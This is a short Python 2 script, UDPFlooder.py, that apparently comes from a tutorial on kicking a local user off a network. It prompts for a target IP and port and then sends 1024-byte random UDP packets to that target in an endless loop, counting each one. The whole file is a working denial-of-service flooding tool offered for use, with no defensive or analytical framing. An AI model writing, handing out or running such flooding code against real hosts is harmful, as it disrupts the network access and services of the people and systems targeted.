# UDPFlooder.py
#
#	UDP Packet Flooder
#	Tutorial on: http://null-byte.wonderhowto.com/how-to/udp-flooding-kick-local-user-off-network-0132581/
#
#	7/15/15
#

import socket # Imports needed libraries
import random

# Creates a socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Creates packet
bytes = random._urandom(1024)

# The IP we are attacking.
ip = raw_input('Target IP: ')

# Port we direct to attack
port = input('Port Number (80 is HTTP): ')

sent = 0

while 1:
	sock.sendto(bytes, (ip, port))
	print "Sent %s amount of packets to %s at port %s." % (sent, ip, port)
	sent += 1